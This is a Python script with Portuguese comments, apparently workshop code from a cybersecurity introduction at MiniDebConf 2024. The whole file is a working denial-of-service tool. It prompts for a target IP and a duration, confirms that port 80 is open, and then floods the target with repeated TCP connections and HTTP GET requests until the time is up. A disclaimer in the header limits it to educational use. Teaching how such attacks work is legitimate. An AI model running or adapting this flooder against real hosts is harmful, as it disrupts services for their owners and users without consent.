"""
Código utilizado na oficina "Introdução à Cibersegurança com Raspberry Pi" durante a
MiniDebConf 2024 - UFMG, Belo Horizonte.

Autor: Lucas Albano

Este script é um exemplo de um ataque de negação de serviço (DoS) simples.

Não utilize este script para atacar sistemas sem permissão. Este script é apenas
para fins educacionais e demonstrativos.
"""

import socket # Utilizado para criar sockets
import time   # Utilizado para controlar a duração do ataque

# Função para testar a conexão com o alvo
def test_connection(ip):
    try:
        # Criando um socket TCP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Definindo um tempo limite de 2 segundos para a conexão
        sock.settimeout(2)
        # Tentando conectar ao IP na porta 80 (HTTP)
        sock.connect((ip,80))
        # Se a conexão for bem-sucedida, retorna True
        return True
    except Exception as e:
        # Se ocorrer algum erro na conexão, retorna False
        return False
    finally:
        # Garante que o socket seja fechado, independentemente do resultado
        sock.close()

# Função para enviar pacotes ao alvo
def attack(ip, duration=60):
    # Tempo inicial do ataque
    start_time = time.time()
    # Contador de pacotes enviados
    sent = 0
    # Enquanto o tempo atual - tempo inicial for menor que a duração do ataque
    while time.time() - start_time < duration:
        try:
            # Criando um novo socket TCP
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Conectando ao IP na porta 80 (HTTP)
            sock.connect((ip, 80))
            # Criando um pedido HTTP GET
            request = b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n"
            # Enviando o pedido
            sock.sendall(request)
            # Incrementando o contador de pacotes enviados
            sent += 1
            # Imprimindo o número do pacote enviado
            print(f"-> Pacote {sent} enviado para {ip}")
            # Fechando o socket
            sock.close()
        except KeyboardInterrupt:
            # Se o usuário interromper o ataque, imprime a mensagem
            print("\n-> Interrompido pelo usuário")
            break
        except Exception as e:
            # Se ocorrer algum erro durante o envio do pacote, imprime a mensagem de erro
            print(f"-> Erro ao enviar pacote para {ip}: {e}")
            break
        finally:
            # Garante que o socket seja fechado, independentemente do resultado
            sock.close()

# Função principal
def main():
    # Solicitando o IP do alvo ao usuário
    ip = input("IP do Alvo: ")
    # Solicitando a duração do ataque (em segundos) ao usuário
    duration = int(input("Duração do Ataque (Em segundos): "))

    print("== Testando conexão com o alvo ==")
    # Testando a conexão com o alvo
    if(test_connection(ip)):
        print("== Conexão Estabelecida ==")
    else:
        print("== Sem Conexão - O alvo pode estar offline ==")
        return

    print("== Iniciando Ataque ==")
    print("-> Pressione CTRL+C para interromper o ataque antes do fim da duração")
    # Aguardando 3 segundos antes de iniciar o ataque
    time.sleep(3)

    try:
        # Iniciando o ataque
        attack(ip, duration)
    except KeyboardInterrupt:
        # Se o usuário interromper o ataque, imprime a mensagem
        print("-> Interrompido pelo usuário")
        return

    print("== Ataque Encerrado ==")

# Verifica se o script está sendo executado diretamente
if __name__ == "__main__":
    main()
   